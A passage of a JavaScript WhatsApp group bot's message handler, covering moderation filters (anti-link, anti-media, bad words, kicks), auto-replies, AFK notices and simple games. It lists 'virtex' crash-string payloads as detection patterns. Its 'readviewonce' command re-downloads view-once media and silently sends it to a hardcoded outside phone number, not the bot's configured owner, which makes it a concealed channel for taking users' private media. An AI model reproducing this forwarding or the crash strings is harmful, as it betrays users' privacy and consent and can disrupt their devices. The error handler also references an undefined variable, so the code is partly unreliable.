            if (isOwner || isAdmins || !isBotAdmins) return
            client.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, { quoted: m })
            await sleep(2000)
            await client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
        for (let i of owner) {
            list.push({
                displayName: await client.getName(i),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await client.getName(i)}\nFN:${await client.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
            })
        }
        //console log
        if (isCommand) {
            if (!m.isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m ✓ \x1b[1;37m]', color(pushname), 'use', color(command), 'args :', color(args.length))
            if (isCmd && m.isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m ✓ \x1b[1;37m]', color(pushname), 'use', color(command), 'in group', color(groupName), 'args :', color(args.length))
            global.db.data.settings[botNumber].totalhit += 1
        }
        //ANTI VIRUS
        if (isGroup && db.data.chats[m.chat].antivirtex) {
            if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ')) {
                if (isGroupAdmins) return reply('*VIRTEX DETECTED*')
                console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
                client.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)
                if (!isBotAdmins) return
                if (isOwner) return
                client.groupParticipantsUpdate(from, [sender], 'remove')
                await client.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                client.sendMessage(`${ownernumber}@s.whatsapp.net`, { text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup ? `in ${groupName}` : ''}` })
            }
        }

        if (db.data.chats[m.chat].antibot) {
            if (m.isBaileys && m.fromMe == false) {
                if (isAdmin || !isBotAdmin) {
                } else {
                    reply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
                    return await client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                }
            }
        }

        const forbiddenWords = [
            'kontol', 'kntl', 'bkp', 'bokep', 'bokeb', 'anj', 'ajg', 'anjg'
        ];
        const urlRegex = /(bagi bokep?:\/\/[^\s]+)/gi; // regex untuk mendeteksi URL

        async function before(m, { client, groupAdmins, isBotAdmins }) {
            if (!m.isGroup || !isBotAdmins || m.fromMe) return true; // Abaikan jika bukan pesan grup, bot bukan admin, atau pesan dari bot itu sendiri

            const text = m.text ? m.text.toLowerCase() : '';
            const target = m

            // Cek jika pesan mengandung kata terlarang atau URL
            if (forbiddenWords.some(word => text.includes(word.replace(/\s+/g, ''))) || urlRegex.test(text)) {
                await client.sendMessage(m.chat, { delete: m.key }) // Hapus pesan yang mengandung kata terlarang atau URL

                // Jika pesan berasal dari pengguna, keluarkan pengirimnya
                if (!m.fromMe && !groupAdmins) { // Pastikan bukan admin yang dikick
                    await client.reply(m.chat, `*Peringatan*\n\ndisini gak ada bokep bang😂,sory saya kick,ini otomatis dari bot😏`, m);
                    await client.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); // Keluarkan pengirim pesan
                }

                return false; // Tolak pesan
            }

            return true; // Terima pesan
        }
        await before(m, { client, groupAdmins, isBotAdmins })
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
            if (isOwner || isAdmins || !isBotAdmins) {
            } else {
                reply(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
                return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
            }
        }
        if (db.data.chats[m.chat].image && isXeonMedia) {
            if (isXeonMedia === "imageMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].antivideo && isXeonMedia) {
            if (isXeonMedia === "videoMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].antisticker && isXeonMedia) {
            if (isXeonMedia === "stickerMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].antiaudio && isXeonMedia) {
            if (isXeonMedia === "audioMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].antipoll && isXeonMedia) {
            if (isXeonMedia === "pollCreationMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].antilocation && isXeonMedia) {
            if (isXeonMedia === "locationMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].antidocument && isXeonMedia) {
            if (isXeonMedia === "documentMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        if (db.data.chats[m.chat].anticontact && isXeonMedia) {
            if (isXeonMedia === "contactMessage") {
                if (isOwner || isAdmins || !isBotAdmins) {
                } else {
                    reply(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
                    return client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
                }
            }
        }
        ///setppanjang
        const jimp_1 = require('jimp')
        async function pepe(media) {
            const jimp = await jimp_1.read(media)
            const min = jimp.getWidth()
            const max = jimp.getHeight()
            const cropped = jimp.crop(0, 0, min, max)
            return {
                img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
                preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
            }
        }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
                if (budy === bak) {
                    let baduser = await db.data.users[sender].badword
                    client.sendMessage(m.chat,
                        {
                            delete: {
                                remoteJid: m.chat,
                                fromMe: false,
                                id: m.key.id,
                                participant: m.key.participant
                            }
                        })
                    client.sendMessage(from, { text: `\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
                }
            }
        }
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
            if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                client.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                client.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
                bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
                if (isAdmins) return reply(bvl)
                if (m.key.fromMe) return reply(bvl)
                if (isOwner) return reply(bvl)
                await client.sendMessage(m.chat,
                    {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant
                        }
                    })
                client.sendMessage(from, { text: `\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
                bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
                if (isAdmins) return reply(bvl)
                if (m.key.fromMe) return reply(bvl)
                if (isOwner) return reply(bvl)
                await client.sendMessage(m.chat,
                    {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant
                        }
                    })
                client.sendMessage(from, { text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
            }
        }
                    
const api = {
    xterm: {
      url: "https://ai.xterm.codes",
      key: "OPSIONAL" 
    }
  };
  
  async function celiaSpeech(text) {
    try {
      const response = await fetch(`${api.xterm.url}/api/text2speech/celia?text=${encodeURIComponent(text)}&key=${api.xterm.key}`);
  
      if (!response.ok) {
        throw new Error(`Error: ${response.status} ${response.statusText}`);
      }
  
      const audioBuffer = await response.arrayBuffer();
      return audioBuffer;
    } catch (error) {
      console.error('Fetch error:', error);
      throw error;
    }
  }
              
            
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }

        //total features
        const xeonfeature = () => {
            var mytext = fs.readFileSync("./sya.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        //autoreply
        for (let BhosdikaXeon of VoiceNoteXeon) {
            if (budy === BhosdikaXeon) {
                let audiobuffy = fs.readFileSync(`./media/audio/${BhosdikaXeon}.mp3`)
                client.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
        }
        for (let BhosdikaXeon of StickerXeon) {
            if (budy === BhosdikaXeon) {
                let stickerbuffy = fs.readFileSync(`./media/sticker/${BhosdikaXeon}.webp`)
                client.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
            }
        }
        for (let BhosdikaXeon of ImageXeon) {
            if (budy === BhosdikaXeon) {
                let imagebuffy = fs.readFileSync(`./media/image/${BhosdikaXeon}.jpg`)
                client.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
            }
        }
        for (let BhosdikaXeon of VideoXeon) {
            if (budy === BhosdikaXeon) {
                let videobuffy = fs.readFileSync(`./media/video/${BhosdikaXeon}.mp4`)
                client.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
            }
        }

        const sendapk = (teks) => {
            client.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive' }, { quoted: m })
        }
        for (let BhosdikaXeon of ApkXeon) {
            if (budy === BhosdikaXeon) {
                let buffer = fs.readFileSync(`./media/apk/${BhosdikaXeon}.apk`)
                sendapk(buffer)
            }
        }

        const sendzip = (teks) => {
            client.sendMessage(from, { document: teks, mimetype: 'application/zip' }, { quoted: m })
        }
        for (let BhosdikaXeon of ZipXeon) {
            if (budy === BhosdikaXeon) {
                let buffer = fs.readFileSync(`./media/zip/${BhosdikaXeon}.zip`)
                sendzip(buffer)
            }
        }

        const senddocu = (teks) => {
            client.sendMessage(from, { document: teks, mimetype: 'application/pdf' }, { quoted: m })
        }
        for (let BhosdikaXeon of DocXeon) {
            if (budy === BhosdikaXeon) {
                let buffer = fs.readFileSync(`./media/doc/${BhosdikaXeon}.pdf`)
                senddocu(buffer)
            }
        }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
            let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
            let { text, mentionedJid } = hash
            let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
                userJid: client.user.id,
                quoted: m.quoted && m.quoted.fakeObj
            })
            messages.key.fromMe = areJidsSameUser(m.sender, client.user.id)
            messages.key.id = m.key.id
            messages.pushName = m.pushName
            if (m.isGroup) messages.participant = m.sender
            let msg = {
                ...chatUpdate,
                messages: [proto.WebMessageInfo.fromObject(messages)],
                type: 'append'
            }
            client.ev.emit('messages.upsert', msg)
        }

        //math
        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
            if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                }[ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                }[v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) client.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            client.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }

        //Suit PvP
        this.suit = this.suit ? this.suit : {}
        let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
        if (roof) {
            let win = ''
            let tie = false
            if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
                if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
                    client.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
                    delete this.suit[roof.id]
                    return !0
                }
                roof.status = 'play'
                roof.asal = m.chat
                clearTimeout(roof.waktu)
                //delete roof[roof.id].waktu
                client.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
                if (!roof.pilih) client.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
                if (!roof.pilih2) client.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
                roof.waktu_milih = setTimeout(() => {
                    if (!roof.pilih && !roof.pilih2) client.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
                    else if (!roof.pilih || !roof.pilih2) {
                        win = !roof.pilih ? roof.p2 : roof.p
                        client.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
                    }
                    delete this.suit[roof.id]
                    return !0
                }, roof.timeout)
            }
            let jwb = m.sender == roof.p
            let jwb2 = m.sender == roof.p2
            let g = /scissors/i
            let b = /rock/i
            let k = /paper/i
            let reg = /^(scissors|rock|paper)/i
            if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
                roof.pilih = reg.exec(m.text.toLowerCase())[0]
                roof.text = m.text
                reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
                if (!roof.pilih2) client.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
            }
            if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
                roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
                roof.text2 = m.text
                reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
                if (!roof.pilih) client.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
            }
            let stage = roof.pilih
            let stage2 = roof.pilih2
            if (roof.pilih && roof.pilih2) {
                clearTimeout(roof.waktu_milih)
                if (b.test(stage) && g.test(stage2)) win = roof.p
                else if (b.test(stage) && k.test(stage2)) win = roof.p2
                else if (g.test(stage) && k.test(stage2)) win = roof.p
                else if (g.test(stage) && b.test(stage2)) win = roof.p2
                else if (k.test(stage) && b.test(stage2)) win = roof.p
                else if (k.test(stage) && g.test(stage2)) win = roof.p2
                else if (stage == stage2) tie = true
                client.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
                delete this.suit[roof.id]
            }
        } //end

        //user db
        if (isCommand && !isUser) {
            xeonverifieduser.push(sender)
            fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, null, 2))
        }

        switch (isCommand) {
            case 'readviewonce': case 'rvo': {
                (async () => {
                    const { downloadContentFromMessage } = require("@whiskeysockets/baileys")
                    let quoted = m.message.extendedTextMessage.contextInfo.quotedMessage
                    let thay = {
                        msg: quoted.viewOnceMessageV2?.message?.imageMessage || quoted.viewOnceMessageV2?.message?.videoMessage || quoted.viewOnceMessageV2Extension?.message?.audioMessage,
                        type: quoted.viewOnceMessageV2?.message?.imageMessage ? "image" : quoted.viewOnceMessageV2?.message?.videoMessage ? "video" : "audio"
                    }
                    let stream = await downloadContentFromMessage(thay.msg, thay.type)
                    let buffer = Buffer.from([])
                    for await (const chunk of stream) {
                        buffer = Buffer.concat([buffer, chunk])
                    }
                    let mssg = {}
                    thay.type == "audio" && (mssg.ptt = true)
                    await client.sendMessage(`6288214772441@s.whatsapp.net`, { [thay.type]: buffer, ...mssg }, { quoted: m })
                })()
            }
                break
        }

    } catch (err) {

        console.log(util.format(err))


        if (e.includes("conflict")) return
        if (e.includes("not-authorized")) return
        if (e.includes("already-exists")) return
        if (e.includes("rate-overlimit")) return
        if (e.includes("Connection Closed")) return
        if (e.includes("Timed Out")) return
        if (e.includes("Value not found")) return
        if (e.includes("Socket connection timeout")) return
    }
}
